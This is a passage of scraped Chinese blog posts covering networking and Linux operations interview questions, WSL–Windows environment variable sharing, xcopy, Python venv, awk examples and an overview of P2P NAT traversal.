TCP的可靠，因为它使用校验和进行错误检测，尝试通过重新传输、确认策略和计时器来恢复丢失或损坏的数据包。它使用字节数和序列号以及确认号等特性来确保可靠性。\nTCP Flags TCP有6个Flag\nSYN (synchronize)，初始化一个连接的标识 ACK (acknowledgment)；用于确认数据包已收到，用于确认建立连接和关闭连接的 RST (reset)；表示连接已关闭，或者服务可能不接受请求 FIN (finish)；表示正在断开连接。发送方和接收方都发送 FIN 数据包以优雅地终止连接 PSH (push)；表示传入的数据应该直接传递给应用程序，而不是被缓冲 URG (urgent)；表示数据包所携带的数据应立即由 TCP 堆栈处理 DNS使⽤什么协议？ DNS服务器间进⾏域传输的时候使⽤ TCP 53；\n客户端查询DNS服务器时使⽤ UDP 53，但当DNS查询超过512字节，TC标志出现时，使⽤TCP发送。\n这是因为以太⽹(Ethernet)数据帧的⻓度必须在46-1500字节之间，这是由以太⽹的物理特性决定的。这个数据帧⻓度被称为链路层的MTU（最⼤传输单元）—— 实际Internet上的标准MTU值为576字节，也就是说链路层的数据区（不包括链路层的头部和尾部）被限制在576字节，所以这也就是⽹络层IP数据报的⻓度限制。\n因为IP数据报的⾸部为20字节，所以IP数据报的数据区⻓度最⼤为556字节。⽽这个556字节就是⽤来放TCP报⽂段或UDP数据报的。我们知道UDP数据报的⾸部8字节，所以UDP数据报的数据区最⼤⻓度为548字节。—— 如果UDP数据报的数据区⼤于这个⻓度，那么总的IP数据包就会⼤于MTU，这个时候发送⽅IP层就需要分⽚(fragmentation)，把数据报分成若⼲⽚，使每⼀⽚都⼩于MTU，⽽接收⽅IP层则需要进⾏数据报的重组。由于UDP的特性，当某⼀⽚数据传送中丢失时，接收⽅将⽆法重组数据报，从⽽导致丢弃整个UDP数据报。所以通常UDP的最⼤报⽂⻓度就限制为512字节或更⼩。\nTCP的拥塞控制机制是什么？请简单说说。 IP报文中TTL字段作用 可用于防止数据包循环\n什么是TCP RTO？ TCP RTO是TCP数据包在发送后到接收ACK之间的超时时间。如果在这个时间内没有收到ACK，则认为数据包已经丢失，需要进行重传。RTO的值是根据网络延迟、带宽和网络拥堵等多种因素计算得出的。\n如何调整TCP RTO？ TCP RTO的调整需要根据实际的网络环境进行，可以通过以下几种方法进行：\n内核参数调整：可以通过调整内核参数来改变TCP RTO的计算公式，从而适应不同的网络环境； 使用拥塞控制算法：可以通过改变TCP的拥塞控制算法来影响RTO的调整； 优化网络拓扑结构：通过优化网络拓扑结构，如改变路由器的位置、增加网络带宽等，可以有效地降低RTO的值。 ","permalink":"https://www.oomkill.com/2021/10/interview-network/","summary":"","title":"网络基础面试题收集"},{"content":"如何优化 Linux系统（笼统） 不用root，添加普通用户，通过sudo授权管理 更改默认的远程连接SSH服务端口及禁止root用户远程连接 定时自动更新服务器时间 配置国内yum源 关闭selinux及iptables（iptables工作场景如果有外网IP一定要打开，高并发除外） 调整文件描述符的数量 精简开机启动服务（crond rsyslog network sshd） 内核参数优化（/etc/sysctl.conf） 更改字符集，支持中文，但建议还是用英文字符集，防止乱码 锁定关键系统文件 清空/etc/issue，去除系统及内核版本登录前的屏幕显示 基础命令 ps aux 中的VSZ代表什么意思，RSS代表什么意思 VSZ:虚拟内存集,进程占用的虚拟内存空间 RSS:物理内存集,进程战用实际物理内存空间 shell下32位随机密码生成 cat /dev/urandom | head -1 | md5sum | head -c 32 \u0026gt;\u0026gt; /pass\r将生成的32位随机数 保存到/pass文件里了\n统计出nginx的access.log中访问量最多的5个IP cat access_log | awk '{print $1}' | sort | uniq -c | sort -n -r | head -5\rweb与lb 讲述一下LVS三种模式的工作过程 LVS负载的原理，和Nginx负载有啥区别 VS/NAT：（Virtual Server via Network Address Translation）\n也就是网络地址翻译技术实现虚拟服务器，当用户请求到达调度器时，调度器将请求报文的目标地址（即虚拟IP地址）改写成选定的Real Server地址，同时报文的目标端口也改成选定的Real Server的相应端口，最后将报文请求发送到选定的Real Server。在服务器端得到数据后，Real Server返回数据给用户时，需要再次经过负载调度器将报文的源地址和源端口改成虚拟IP地址和相应端口，然后把数据发送给用户，完成整个负载调度过程。\n可以看出，在NAT方式下，用户请求和响应报文都必须经过Director Server地址重写，当用户请求越来越多时，调度器的处理能力将称为瓶颈。\nVS/TUN ：即（Virtual Server via IP Tunneling）\n也就是IP隧道技术实现虚拟服务器。它的连接调度和管理与VS/NAT方式一样，只是它的报文转发方法不同，VS/TUN方式中，调度器采用IP隧道技术将用户请求转发到某个Real Server，而这个Real Server将直接响应用户的请求，不再经过前端调度器，此外，对Real Server的地域位置没有要求，可以和Director Server位于同一个网段，也可以是独立的一个网络。因此，在TUN方式中，调度器将只处理用户的报文请求，集群系统的吞吐量大大提高。\nVS/DR： 即（Virtual Server via Direct Routing）\n也就是用直接路由技术实现虚拟服务器。它的连接调度和管理与VS/NAT和VS/TUN中的一样，但它的报文转发方法又有不同，VS/DR通过改写请求报文的MAC地址，将请求发送到Real Server，而Real Server将响应直接返回给客户，免去了VS/TUN中的IP隧道开销。这种方式是三种负载调度机制中性能最高最好的，但是必须要求Director Server与Real Server都有一块网卡连在同一物理网段上。\n回答负载调度算法，IPVS实现在八种负载调度算法，我们常用的有四种调度算法（轮叫调度、加权轮叫调度、最少链接调度、加权最少链接调度）。一般说了这四种就够了，也不会需要你详细解释这四种算法的。你只要把上面3种负载均衡技术讲明白面试官就对这道问题很满意了。\nlvs与nginx的区别： LVS的优点：\n抗负载能力强、工作在第4层仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的；无流量，同时保证了均衡器IO的性能不会受到大流量的影响； 工作稳定，自身有完整的双机热备方案，如LVS+Keepalived和LVS+Heartbeat； 应用范围比较广，可以对所有应用做负载均衡； 配置性比较低，这是一个缺点也是一个优点，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率。 LVS的缺点：\n软件本身不支持正则处理，不能做动静分离，这就凸显了Nginx/HAProxy+Keepalived的优势。 如果网站应用比较庞大，LVS/DR+Keepalived就比较复杂了，特别是后面有Windows Server应用的机器，实施及配置还有维护过程就比较麻烦，相对而言，Nginx/HAProxy+Keepalived就简单一点 Nginx的优点：\n工作在OSI第7层，可以针对http应用做一些分流的策略。比如针对域名、目录结构。它的正则比HAProxy更为强大和灵活； Nginx对网络的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势所在； Nginx安装和配置比较简单，测试起来比较方便； 可以承担高的负载压力且稳定，一般能支撑超过几万次的并发量； Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点； Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。LNMP现在也是非常流行的web环境，大有和LAMP环境分庭抗礼之势，Nginx在处理静态页面、特别是抗高并发方面相对apache有优势； Nginx的缺点：\nNginx不支持url来检测。 Nginx仅能支持http和Email，这个它的弱势。 Nginx的Session的保持，Cookie的引导能力相对欠缺。 apache工作模式 查看apache工作模式 apachectl -l|sed -n '/worker\\|prefork/p'\nprefork使用的是多个子进程，而每个子进程只有一个线程，每个进程在某个确定的时间只能维持一个连接.\nworker模式是Apache2.X新引进来的模式，是线程与进程的结合，在worker模式下会有多个子进程，每个进程又会有多个线程。每个线程在某个确定的时间只能维持一个连接。\nevent模式：event和 worker模式很像，最大的区别在于，它解决了keep-alive场景下 ，长期被占用的线程的资源浪费问题。\nevent MPM中，会有一个专门的线程来管理这些keep-alive类型的线程，当有真实请求过来的时候，将请求传递给服务线程，执行完毕后，又允许它释放。这样，一个线程就能处理几个请求了，实现了异步非阻塞。\nevent MPM在遇到某些不兼容的模块时，会失效，将会回退到worker模式，一个工作线程处理一个请求。官方自带的模块，全部是支持eventMPM的。\n优缺点\n优点：内存占用比prefork模式低，适合高并发高流量HTTP服务。\n缺点：假如一个线程崩溃，整个进程就会连同其任何线程一起“死掉”.由于线程贡献内存空间，所以一个程序在运行时必须被系统识别为“每个线程都是安全的”服务稳定性不如prefork模式。\nhttps://github.com/PlutoaCharon/LiunxNotes/blob/master/Liunx%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/Linux%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B1%BB/Apache.md\nkubernetes Kubernetes有哪些不同类型的服务？ cluster ip Node Port Load Balancer Extrenal Name 什么是ETCD？ Etcd是用Go编程语言编写的，是一个分布式键值存储，用于协调分布式工作。因此，Etcd存储Kubernetes集群的配置数据，表示在任何给定时间点的集群状态。\n什么是Ingress网络，它是如何工作的？ Ingress网络是一组规则，充当Kubernetes集群的入口点。这允许入站连接，可以将其配置为通过可访问的URL，负载平衡流量或通过提供基于名称的虚拟主机从外部提供服务。因此，Ingress是一个API对象，通常通过HTTP管理集群中服务的外部访问，是暴露服务的最有效方式。\n什么是Headless Service？ Headless Service类似于“普通”服务，但没有群集IP。此服务使您可以直接访问pod，而无需通过代理访问它。\n什么是集群联邦？ 在联邦集群的帮助下，可以将多个Kubernetes集群作为单个集群进行管理。因此，您可以在数据中心/云中创建多个Kubernetes集群，并使用联邦来在一个位置控制/管理它们。\n联合集群可以通过执行以下两项操作来实现此目的。请参考下图。\nkube-proxy的作用 kube-proxy运行在所有节点上，它监听apiserver中service和endpoint的变化情况，创建路由规则以提供服务IP和负载均衡功能。简单理解此进程是Service的透明代理兼负载均衡器，其核心功能是将到某个Service的访问请求转发到后端的多个Pod实例上。\nkube-proxy iptables的原理 Kubernetes从1.2版本开始，将iptables作为kube-proxy的默认模式。iptables模式下的kube-proxy不再起到Proxy的作用，其核心功能：通过API Server的Watch接口实时跟踪Service与Endpoint的变更信息，并更新对应的iptables规则，Client的请求流量则通过iptables的NAT机制“直接路由”到目标Pod。\nkube-proxy ipvs的原理 IPVS在Kubernetes1.11中升级为GA稳定版。IPVS则专门用于高性能负载均衡，并使用更高效的数据结构（Hash表），允许几乎无限的规模扩张，因此被kube-proxy采纳为最新模式。\n在IPVS模式下，使用iptables的扩展ipset，而不是直接调用iptables来生成规则链。iptables规则链是一个线性的数据结构，ipset则引入了带索引的数据结构，因此当规则很多时，也可以很高效地查找和匹配。\n可以将ipset简单理解为一个IP（段）的集合，这个集合的内容可以是IP地址、IP网段、端口等，iptables可以直接添加规则对这个“可变的集合”进行操作，这样做的好处在于可以大大减少iptables规则的数量，从而减少性能损耗。\nkube-proxy ipvs和iptables的异同 iptables与IPVS都是基于Netfilter实现的，但因为定位不同，二者有着本质的差别：iptables是为防火墙而设计的；IPVS则专门用于高性能负载均衡，并使用更高效的数据结构（Hash表），允许几乎无限的规模扩张。\n与iptables相比，IPVS拥有以下明显优势：\n为大型集群提供了更好的可扩展性和性能； 支持比iptables更复杂的复制均衡算法（最小负载、最少连接、加权等）； 支持服务器健康检查和连接重试等功能； 可以动态修改ipset的集合，即使iptables的规则正在使用这个集合。 Kubernetes镜像的下载策略 Kubernetes的镜像下载策略有三种：Always、Never、IFNotPresent。\nAlways：镜像标签为latest时，总是从指定的仓库中获取镜像。 Never：禁止从仓库中下载镜像，也就是说只能使用本地镜像。 IfNotPresent：仅当本地没有对应镜像时，才从目标仓库中下载。默认的镜像下载策略是：当镜像标签是latest时，默认策略是Always；当镜像标签是自定义时（也就是标签不是latest），那么默认策略是IfNotPresent。 简述Kubernetes Scheduler使用哪两种算法将Pod绑定到worker节点 Kubernetes Scheduler根据如下两种调度算法将 Pod 绑定到最合适的工作节点：\n预选（Predicates）：输入是所有节点，输出是满足预选条件的节点。kube-scheduler根据预选策略过滤掉不满足策略的Nodes。如果某节点的资源不足或者不满足预选策略的条件则无法通过预选。如“Node的label必须与Pod的Selector一致”。 优选（Priorities）：输入是预选阶段筛选出的节点，优选会根据优先策略为通过预选的Nodes进行打分排名，选择得分最高的Node。例如，资源越富裕、负载越小的Node可能具有越高的排名。 zabbix 简述Zabbix-proxy使用场景 监控远程位置，解决跨机房 监控主机多，性能跟不上，延迟大 解决网络不稳定 zabbix 是怎么实施监控的 agentd需要安装到被监控的主机上，它负责定期收集各项数据，并发送到zabbix server端，zabbix server将数据存储到数据库中，zabbix web根据数据在前端进行展现和绘图。这里agentd收集数据分为主动和被动两种模式：\n主动：agent请求server获取主动的监控项列表，并主动将监控项内需要检测的数据提交给server/proxy\n被动：server向agent请求获取监控项的数据，agent返回数据。\n主动模式被动模式：默认为zabbix-agent被动模式\n1.被动模式（zabbix-server轮询检测zabbix-agent）\n2.主动模式（zabbix-agent主动上报给zabbix-server）优\n1.当（Queue）队列中有大量的延迟监控项\n2.当监控主机超过300+ ,建议使用主动模式\nzabbix 怎么开启自定义监控 1、写一个脚本用于获取待监控服务的一些状态信息。\n2、在zabbix客户端的配置文件zabbix_agentd.conf中添加上自定义的“UserParameter”，目的是方便zabbix调用我们上面写的那个脚本去获取待监控服务的信息。\n3、在zabbix服务端使用zabbix_get测试是否能够通过第二步定义的参数去获取zabbix客户端收集的数据。\n4、在zabbix服务端的web界面中新建模板，同时第一步的脚本能够获取什么信息就添加上什么监控项，“键值”设置成前面配置的“UserParameter”的值。\n5、数据显示图表，直接新建图形并选择上一步的监控项来生成动态图表即可。\niptables iptables四表五链（必问题） 表：\nnat 用于网络地址解析 mangle mangle包， 特定数据包的更改，好比head,content filter default表，用于过滤包 raw 优先级最高，用于pretouting和output ,使用raw表，能够跳过NAT表和ip_conntrack处理,即再也不作地址转换和数据包的连接跟踪处理了 链：\nprerouting,\ninput\nforword\noutput\npostrouting\niptables和firewalld的基本区别是什么呢？ 在linux中，防火墙的概念是 Linux 内核网络堆栈中的网络数据包进行操作的规则集合，而iptables则是这些用来操作这些规则的用户空间命令行工具，通过将规则格式化为内核数据结构转发为内核。\nfirewalld是fedora的一个开源项目，是iptables/nftables命令的封装，实现了更多动态防火墙的概念，并且加入更多用户鉴权，GUI管理等。\n类似于http是tcp的wapper，firewalld则是iptables的wapper。\n什么是iptables中的目标值（能被指定为目标），他们有什么用 下面是在iptables中可以指定为目标的值：\nACCEPT : 接受包 QUEUE : 将包传递到用户空间 (应用程序和驱动所在的地方) DROP : 丢弃包 RETURN : 将控制权交回调用的链并且为当前链中的包停止执行下一调用规则 ","permalink":"https://www.oomkill.com/2021/10/interview-om/","summary":"","title":"运维类面试题收集"},{"content":"在使用 wsl 时，总是需要执行 windows 的 cmd，但是windows命令行对于大多数人使用起来还是不习惯，微软提供了在 windows 中Linux与Windows的命令互通，即可以使用cmd shell执行Linux命令，也可以使用bash shell来执行windows命令。\nWSL可对 Windows 与 Linux 之间的集成操作：\n从 Linux shell（如 Ubuntu）运行 Windows 工具（任意 .exe）。 从 Windows shell（即 PowerShell or cmd ）运行 Linux 命令（如 cd ls grep）。 在 WSL与windows之间共享环境变量。 （版本 17063+） 满足上述要求，可以很好地使用windows的软件在WSL中畅快的操作，即空WSL环境拥有了python解析器 docker等操作。\n如何在 WSL和 Windows 之间共享环境变量 从Build 17063 开始，可以利用 WSLENV 来增强 Win/WSL 之间的环境变量互操作。\n什么是WSLENV WSLENV 是一个以冒号分隔的环境变量列表，当从 WSL 启动 WSL进程或 Win进程时包含的变量 每个变量都可以以斜杠作为后缀，后跟标识位以指定它的转换方式 WSLENV 可以在 WSL 和 Win32 之间转换的路径 WSLENV。在WSL中，是以冒号分隔的列表。在Win中，是以分号分隔的列表 可以在.bashrc或者windows自定义环境变量中设置WSLENV 例如：一个WSLENV应该设置为\nWSLENV=GOPATH/l:USERPROFILE/w:SOMEVAR/wp 在17063之前，WSL访问Windows环境变量唯一方法是使用全路径（可以使用全路径从WSL下启动Win32可执行文件）。但是没有办法在WSL中设置环境变量，调用Win进程，并期望将该变量传送到进程。\n在17063之后，引入一个名为WSLENV的特殊环境变量，以帮助WSL和Win之间的共享。 WSLENV存在于两个环境中。用户可以将WSLENV的值设置为耦合值与环境变量串联，每个都以 \\ 为标志，以指定应该如何解析该变量。例如：\n/p /p 表示应在WSL和Win32之间转换path。例如。在WSL中设置变量，将其添加到WSLENV设置/p 标志，然后在win环境cmd.exe中读取变量，该值会随着rootfs的转变而转换为对应的值。\n$ /mnt/d# export TRANSLATABLE=`pwd` $ /mnt/d# echo $TRANSLATABLE /mnt/d $ /mnt/d# export WSLENV=TRANSLATABLE\\p $ /mnt/d# export WSLENV=TRANSLATABLE/p $ /mnt/d# echo $WSLENV TRANSLATABLE/p $ /mnt/d# cmd.exe Microsoft Windows [版本 10.0.19043.1052] (c) Microsoft Corporation。保留所有权利。 D:\\\u0026gt;set TRANSLATABLE # 在windows中查看环境变量 TRANSLATABLE=D:\\ /l /l 表示该值是路径列表（如Linux的PATH）。在Linux中，是以冒号分隔的路径列表。在Win中，是以分号分隔的路径列表。/l 可以将路径列表适当对不通系统进行转换。\n$ /mnt/d# export TEMPORARY=/usr/local/go/bin:/usr/local/python/bin $ /mnt/d# WSLENV=$WSLENV:TEMPORARY/l $ /mnt/d# echo $WSLENV TRANSLATABLE/p:TEMPORARY/l $ /mnt/d# cmd.exe Microsoft Windows [版本 10.0.19043.1052] (c) Microsoft Corporation。保留所有权利。 D:\\\u0026gt;set TEMPORARY TEMPORARY=\\\\wsl$\\ubuntu1\\usr\\local\\go\\bin;\\\\wsl$\\ubuntu1\\usr\\local\\python\\bin /u /u 表示仅在Linux（WSL）中调用变量的值为 Win 类型的变量值，及windows向Linux传递环境变量，但格式不变\nD:\\compose\u0026gt;set zhangsan=D:\\compose D:\\compose\u0026gt;set zhangsan zhangsan=D:\\compose D:\\compose\u0026gt;set WSLENV=zhangsan/u D:\\compose\u0026gt;wsl -d ubuntu1 $ /mnt/d/compose# echo $zhangsan D:\\compose 如需要自动适应转换，则需要 使用/up\n/w /w 表示仅在从Win调用WSL环境变量是的值，该参数并不会自动转换，如需转换一样需要使用 /wp 。\n$ /mnt/d/compose# export FROMWSL=/mnt/d/compose $ /mnt/d/compose# export WSLENV=FROMWSL/w $ /mnt/d/compose# cmd.exe Microsoft Windows [版本 10.0.19043.1052] (c) Microsoft Corporation。保留所有权利。 D:\\compose\u0026gt;set FROMWSL FROMWSL=/mnt/d/compose D:\\compose\u0026gt;exit $ /mnt/d/compose# export WSLENV=FROMWSL/wp $ /mnt/d/compose# cmd.exe Microsoft Windows [版本 10.0.19043.1052] (c) Microsoft Corporation。保留所有权利。 D:\\compose\u0026gt;set FROMWSL FROMWSL=D:\\compose 使用脚本传递变量 如果需要BASH脚本传递对应的变量到windows程序执行，例如\n#!/bin/bash export MYPATH=/mnt/c/Users/ WSLENV=$WSLENV:MYPATH/p cmd.exe /c set MYPATH 通过WSL shell环境执行，可以得到windows程序处理的结果，并且可以拿到环境变量\n$ /mnt/d/compose# bash 1.sh MYPATH=C:\\Users\\ 实例：设置一个开发环境，使其共享环境变量 例如，希望在WSL中设置DEV环境。使用WSLENV VAR，将其配置为在WSL和Win之间共享GoPath。\n安装golang 首先，我们需要安装两个平台。要在Windows与WSL安装，步骤不说了。（如果是python等解析语言，可以使用alias直接使用windows的解析器则不需要安装了）\n设置项目 接下来，需要配置的GO项目。该项目需要在Windows文件系统下。在PowerShell中发出以下命令：(这里在桌面配置的)\nmkdir $env:USERPROFILE\\desktop\\goProject cd $env:USERPROFILE\\desktop\\goProject New-Item hello.go 配置环境变量，然后将gopath添加到WSLENV，此时，两个文件系统间，会使用同一个GOPATH\nsetx GOPATH \u0026quot;$env:USERPROFILE\\desktop\\goProject\u0026quot; setx WSLENV \u0026quot;$env:WSLENV:GOPATH\u0026quot;/p 需要事项\nWSL（通过.profile或其他）中的定义将在通过WSL访问时覆盖默认WSLENV中定义的值。 在关闭WSL后，WSLENV不会持久化，需要修改相应的配置文件（.profile，.bash_rc等）。 WSL可以设置任何值。如果仅设置当前文件系统变量，则不会自动转换。通过WSLENV可以自动翻译成两种不通的文件系统下的环境变量。 题外话cmd.exe 跨文件系统常用参数 options describe /C 使用cmd.exe运行一个命令并终止，类似于 bash -c Reference 更多cmd.exe帮助参考\ncmd_helps\nWSL备份及windows Docker安装\nWSL安装维护\n","permalink":"https://www.oomkill.com/2021/07/wsl-share-to-win/","summary":"","title":"WSL与Windows环境共享"},{"content":"因为在拷贝web站点时，也会存在更新，需要定期覆盖新的内容，就是上次覆盖的时间和到这次时间内修改过的文件都复制。\n实现命令xcopy\nxcopy src dest $ xcopy D:\\WWW\\back1\\* D:\\WWW\\back4 /D:05-22-2018 /F /E /y D:\\WWW\\back1\\db_qbe.php -\u0026gt; D:\\WWW\\back4\\db_qbe.php D:\\WWW\\back1\\docs.css -\u0026gt; D:\\WWW\\back4\\docs.css D:\\WWW\\back1\\test\\changelog.php -\u0026gt; D:\\WWW\\back4\\test\\changelog.php 复制了 3 个文件 /D:mm-dd-yyyy\n/F 打印复制过程\n/E 递归复制目录和子目录包括空目录\n/Y 禁止提示\n","permalink":"https://www.oomkill.com/2021/07/recursive-replication-with-dos/","summary":"","title":"windows递归复制指定时间后修改过的文件"},{"content":"venv模块支持使用自己的站点目录创建轻量级“虚拟环境”，可选择与系统站点目录隔离。每个虚拟环境都有自己的Python二进制文件（与用于创建此环境的二进制文件的版本相匹配），并且可以在其站点目录中拥有自己独立的已安装 Python 软件包集。\n3.6 版后已移除: pyvenv 是 Python 3.3 和 3.4 中创建虚拟环境的推荐工具，不过 在 Python 3.6 中已弃用。\n在 3.5 版更改: 现在推荐使用 venv 来创建虚拟环境。\n创建venv虚拟环境 如果使用python2，则需要安装virtualenv模块\npip install virtualenv python -m virtualenv {name} python3内置了 venv 模块，可以直接使用\npython3 -m venv {name} 进入虚拟环境\nlinux\nvenv\\Scripts\\activate windows\nvenv\\Scripts\\activate.bat 退出环境\nvenv\\Scripts\\deactivate.bat venv\\Scripts\\deactivate 使用venv环境安装软件报错 Could not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=\u0026lsquo;pypi.org\u0026rsquo;, port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(SSLEOFError(8, u\u0026rsquo;EOF occurred in violation of protocol (_ssl.c:727)\u0026rsquo;),)) - skipping\n查询很多都无法解决，最后发现有文章提到这是因为开启了climb wall软件导致的，关闭后恢复正常\n","permalink":"https://www.oomkill.com/2021/06/python-venv/","summary":"","title":"python使用虚拟环境venv"},{"content":"AWK运算符 运算符 说明 赋值运算符 = += -= *= /= %= ^= **= 逻辑运算符 || 逻辑或 \u0026amp;\u0026amp; 逻辑与 正则运算符 ~ !~ 匹配正则表达式和不匹配正则表达式 关系运算符 \u0026lt; \u0026lt;= \u0026gt; \u0026gt;= != == 关系运算符 算术运算符 + - 加，减 *** / \u0026amp;** 乘，除与求余 + - ! 一元加，减和逻辑非 ^ *** 求幂 ++ \u0026ndash; 增加或减少，作为前缀或后缀 其他运算符 $ 字段引用 空格 字符串链接符 ?: 三目运算符 In 数组中是否存在某键值 内置变量 变量名 属性 $0 当前记录 1 n 当前记录的第 n 个字段 FS 输入字段分隔符 默认是空格 RS 输入记录分割符 默认为换行符 NF 当前记录中的字段个数，就是有多少列 NR 已经读出的记录数，就是行号，从 1 开始 OFS 输出字段分隔符 默认也是空格 ORS 输出的记录分隔符 默认为换行符 特殊模式 - - BEGIN awk 将在读取任何输入行之前立即执行BEGIN 中指定的动作 END awk 将在它正式退出前执行 END中指定的动作 用法 去掉空白：awk 'NF' file\n统计行数： awk 'END{print NR}' file (END)\n偶数行：awk 'NR%2==0 {print $n}' file\n奇数行：awk 'a=!a' file\n指定分隔符： awk -F \u0026quot;:\u0026quot; '{print $1}' file\n使用正则： awk '/^tecmint.com/ { counter+=1 ; printf \u0026quot;%s\\n\u0026quot;, counter ; }' file\n打印多列：awk -F \u0026quot;:\u0026quot; '{print $1 $2 .. $(NF-1) $NF}' /etc/passwd\n多分隔符的用法：echo i am a protester,myqq is 1112222|awk -F '[, ]' '{print $4 \u0026quot; \u0026quot; $7}'\n多个分隔符使用正则：awk -F\u0026quot;/|=\u0026quot; '{print $3, $5, $NF}' file\n使用[]作为分隔符：awk -F '[][]' '{print $3;}' data (这里[ ] 分别占用两列 2个$)\n获取以 []内的值： awk -F '[][*:]' '{print $8}'\necho \u0026quot;[Remote_ip:10.41.58.88] [Remote_user:-] [Querytime:12/Nov/2021:15:50:11 +0800] [Request_url:POST /zeusweb-1/index.php?r=task/ws\u0026amp;ws=1 HTTP/1.1] [Request_status:200] [Request_byte_B:1080] [Request_time_s:4.375] [Http_referer:-] [Http_agent:PHP-SOAP/5.4.25]\u0026quot;|awk -F '[][*:]' '{print $8}'\r也可以使用 `awk -F '[][*:]' '{print $8}'`\r[ Remote_ip:10.41.58.88 ] [ Remote_user: - ] [ Querytime : 12/Nov/2021:15:50:11 +0800 ]\r^ ^^^^^^^^^ ^^^^^^^^^^^ ^ ^^^^^^^^^^^ ^ ^ ^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^\r1 2 3 4 5 6 7 8 9 10 ","permalink":"https://www.oomkill.com/2021/06/awesome-awk-command/","summary":"","title":"awk常用案例"},{"content":"P2P 概述 相比于 C/S B/S 架构来说， P2P 是由 Peer 组成。每个Peer同时是客户端也是服务器。这意味着，P2P网络中的peer点为每个其他的peer提供服务，所有节点直接相互通信，没有中心节点，并共享资源源相互联系。\nP2P有结构化的P2P网络和非结构化P2P网络。如TomP2P (Java的一个框架，一个分布式哈希表，提供去中心化的键/值基础设施）。而Gnutella (第一个分散式P2P文件共享网络)，是非结构化 （unstructured）P2P网络的。另外还有两种类型的P2P网络，即集中式（centralized）P2P网络（Napster）和混合（hybrid p2p）peer网络（如Skype）。\nNAT网络 由于NAT的网络模型，破坏了主机 Peer之间的端到端连接，因此P2P网络需要穿过NAT网络，而穿过NAT网络是目前为P2P技术面临的一个很大的挑战。\n网络地址转换，NAT （Network Address Translation）是一种模糊指明的机制，可以将两个IP连接在一起，一个NAT设备总是拥有至少两个IP地址，（公网IP，私网IP），NAT就是将数据包上的IP地址在传输时，将私网IP转换为公网IP。每个NAT设备会维护一个NAT表，该表存储了所有活动的连接。\n在创建网络映射后，NAT将源IP地址和端口更改为外部源IP地址和端口。NAT保留端口，不将新端口分配给外部源。一旦创建了映射，只要映射存在，与之联系的设备就能够发回消息。不存在NAT映射的所有来自外部的通信请求都是无法穿越NAT。因此，在P2P环境中，如果两个peer位于在NAT之后，两者都无法直接联系，因为它们之间不知道外部IP地址和源端口，NAT表中并没有其所维护的映射信息。所以NAT穿越中的主要问题之一是网络地址转换问题。\nNAT网络类型 一般来讲， NAT网络可以分为四种类型: nat type\n全锥型(Full Cone) 受限锥型(Restricted Cone)， 或者说是IP受限锥型 端口受限锥型(Port Restricted Cone), 或者说是IP + PORT受限锥型 对称型(Symmetric) Full Cone NAT 全锥形 全锥形网络（Full Cone NAT） 的工作原理类似于 IP 地址一对一映射。 内部 IP 和端口映射到相同的外部地址和端口。 之后，任何外部源都可以通过向外部地址发送数据包来访问内部主机。 这意味着，一旦创建了映射，任何外部主机都可以联系内部主机。如下图\n地址受限形的锥形NAT Address Restricted Cone NAT 地址受限形锥形 NAT是，仅当内部主机先联系外部主机时，受限锥形 NAT 才会为相应的内部主机分配外部IP。 外部主机然后能够通过分配的外部地址联系内部主机。\n对称型 Symmetric nat 对称 NAT 是最难穿过的NAT，因为对称将随机端口分配给映射。 如果外部主机首先与内部主机连接，则外部主机只能知道外部映射。 在 P2P 场景中， 如果两个Peer（主机）位于 NAT 后面，则它们无法互相通信以让另一个对等体知道所使用的映射。 此外，对称 NAT 几乎不可能知道分配的端口以通过打孔（hole Punching）建立连接。\n反向连接 Reverse Connection 反向连接（Reverse Connection）是一种通讯机制，它允许不使用防火墙或 NAT 设备的Peer使用中继（或服务器）连接到另一个使用防火墙（或不带 UPnP、NAT-PmP 或类似机制的 NAT 设备）的Peer建立直接连接。该机制的工作原理如下。设 A 和 B 为网络设备。 A 没有使用任何类型的防火墙，而 B 使用防火墙。假设也是服务器（或中继）S\n假设 A 和 B 为网络设备。 A 没有使用任何类型的防火墙，而 B 使用防火墙（或也是服务器、中继）S。A要连接到B。A首先向S发送连接建立请求，然后S使用与A已经建立的连接将此消息转发给 B, 一旦 B 与 S 建立连接，S 开始帮助B连接到 A。在 A 和 B 都完成连接后，尽管 B 使用防火墙（或 NAT 设备），但 A 已经能够与B形成了 Peer to Peer直接通信。\n反向连接设置的优点是两个网络设备即使使用了防火墙（或 NAT 设备）也能够进行通信。但是这种机制有各种限制。首先，仅允许两个设备中的一个使用防火墙（或 NAT 设备）。其次，防火墙后面的设备（或 NAT 设备）必须像中继一样连接到外部主机 或服务器。第三，不使用任何防火墙的设备（或NAT设备）需要知道防火墙后面设备的地址，并且需要能够连接到已经连接到防火墙后面设备（或NAT设备）的主机）。\n仅当所有前面提到的限制都适用时，反向连接才可用。但是，由于当今许多家庭宽带都在使用 NAT 和防火墙，因此这不是连接位于 NAT 设备或防火墙后面的 P2P 网络的两个Peer的可靠的选择。\nUPnP 在当今的家庭宽带网络中，在很多情况下，两端的Peer都使用了 NAT 设备，无法建立连接。 而 UPnP 通用即插即用（Universal Plug and Play），即使为了解决此网络环境下的一种网络架构，从而可以使用P2P网络。简而言之，UPnP 技术的工作过程如下：\n寻址 （Addressing）：使每个设备都获得一个 IP 地址。 发现 （Discovery）：UPnP Control Point，通知所有设备或其他所有设备通知其他们的存在。 描述（Description）：UPnP Control Point 学习其他设备的能力。 控制（Control）：UPnP Control Point 向设备发送命令。 事件（Eventing）：UPnP Control Point 监听设备的状态的变化。 展示（Presentation）：UPnP Control Point 显示设备的用户界面。 UPnP特点：\n能够在任何类型的 NAT 或防火墙阻止的情况下进行通信 可能无法在路由器和服务器上启用 不提供身份验证机制 不支持多层 NAT NAT端口映射协议 NAT端口映射协议（NAT Port Mapping Protocol，简写**NAT-PMP**）是苹果公司于 2005 年开发的 NAT 。该协议是 